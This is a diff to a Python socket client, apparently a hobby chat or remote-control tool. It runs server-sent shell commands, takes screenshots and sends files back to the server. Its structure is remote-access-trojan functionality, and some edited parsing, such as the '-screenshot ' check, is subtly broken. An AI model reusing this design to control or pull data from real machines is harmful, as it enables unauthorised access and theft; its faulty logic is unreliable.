@@ -6,6 +6,7 @@ import subprocess
 import os
 import time
 import pyautogui
+from colorama import Fore, Style, init
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--name", help="Initial buffer to send")
@@ -22,6 +23,9 @@ s.connect(("localhost", 5000))
 s.send(name.encode("UTF-8"))
 
 name = args.name + "> "
+
+global forbid_sending
+forbid_sending = False
 
 def execute_command(command):
     """
@@ -52,11 +56,10 @@ def transfer_file(priorityname, file_path):
     file_size = os.path.getsize(file_path)
     filename = os.path.basename(file_path)
 
-    header = f"FILE_TRANSFER {filename} to {priorityname} {file_size}\n"
+    header = f"FILE_TRANSFER {filename} to {priorityname} {file_size} HEADER-END\n"
     s.sendall(header.encode("UTF-8"))
 
     with open(file_path, "rb") as f:
-        #print("SENDING_FILE: ", file_path, "SIZE: ", file_size)
         while True:
             chunk = f.read(4096)
 
@@ -90,35 +93,36 @@ def receive_file(client, first_data, filename, file_size):
 def client_sender():
 
     while True:
-        cmd = input(name)
-        if cmd == "":
-            continue
-        elif cmd == "exit":
-            cmd = cmd + "\n"
+        if forbid_sending == False:
+            cmd = input(name)
+            if cmd == "":
+                continue
+            elif cmd == "exit":
+                cmd = cmd + "\n"
+                s.send(cmd.encode("UTF-8"))
+                break
+
+            elif cmd.startswith("dataPush"):
+                parts = cmd.split()
+
+                if len(parts) < 3:
+                    print("Usage: dataPush <target> <filename>")
+                    continue
+
+                op = parts[1]
+                filename = parts[2]
+
+                file_path = os.path.join(os.getcwd(), filename)
+
+                if not os.path.isfile(file_path):
+                    print(f"File not found: {file_path}")
+                    continue
+
+                transfer_file(op, file_path)
+                continue
+            cmd = name + cmd + "\n"
+
             s.send(cmd.encode("UTF-8"))
-            break
-        
-        elif cmd.startswith("dataPush"):
-            parts = cmd.split()
-
-            if len(parts) < 3:
-                print("Usage: dataPush <target> <filename>")
-                continue
-
-            op = parts[1]
-            filename = parts[2]
-
-            file_path = os.path.join(os.getcwd(), filename)
-
-            if not os.path.isfile(file_path):
-                print(f"File not found: {file_path}")
-                continue
-
-            transfer_file(op, file_path)
-            continue
-        cmd = name + cmd + "\n"
-
-        s.send(cmd.encode("UTF-8"))
 
 def receive_cmd_output(client, val):
     buffer = val.encode("UTF-8")
@@ -135,6 +139,7 @@ def receive_cmd_output(client, val):
 
 
 def client_listener():
+    global forbid_sending
     while True:
         try:
             buffer = s.recv(1024)
@@ -185,6 +190,12 @@ def client_listener():
 
                 continue
 
+            if data == "SENDING_FORBIDDEN":
+                forbid_sending = True
+                continue
+            elif data == "SENDING ALLOWED":
+                forbid_sending = False
+                continue
             if data.split(" ")[1] == "-run":                
                 priorityname = data.split(" ")[0]
                 command = data.split(priorityname + " -run ")[1]
@@ -192,8 +203,7 @@ def client_listener():
                 output = execute_command(command)
 
                 message = (
-                    name
-                    + "CMD_OUTPUT "
+                    "CMD_OUTPUT "
                     + priorityname
                     + " "
                     + output.decode("UTF-8", errors="ignore")
@@ -203,7 +213,7 @@ def client_listener():
                 s.send(message.encode("UTF-8"))
                 continue
             
-            elif data.startswith("-screenshot "):
+            elif data.split(" ")[1] == "-screenshot ":
                 priority_name = data.split()[1]
 
                 screenshot_path = os.path.join(
@@ -220,13 +230,12 @@ def client_listener():
                         os.remove(screenshot_path)
                     except OSError:
                         pass
+                continue
 
             elif data.split(" ")[1] == "-get":
                 priorityname = data.split(" ")[0]
-                filenameWithname = data.split(priorityname + " -get ")[1].strip()
-                filename= filenameWithname.split(" ")[1]
-
-                #print(f"Receiving file {filename} from {priorityname}")
+                filename= data.split(" ")[2]
+                print("FILENAME:", repr(filename))
                 file_path = os.path.join(os.getcwd(), filename)
                 #print("FILE_PATH: ", file_path, "FULENAME: ", filename)
                 transfer_file(priorityname, file_path)
@@ -237,7 +246,7 @@ def client_listener():
             dataname = data.split(">")[0].strip()
             #print(f"Received from DATANAME: {dataname}")
             if dataname == "" or not ">" in data:
-                print(f"\n[ALERT] Received ALERT from server: {data}")
+                print(Fore.RED + f"\n[ALERT] Received ALERT from server: {data}")
                 continue
 
             if dataname != name[:-2]:
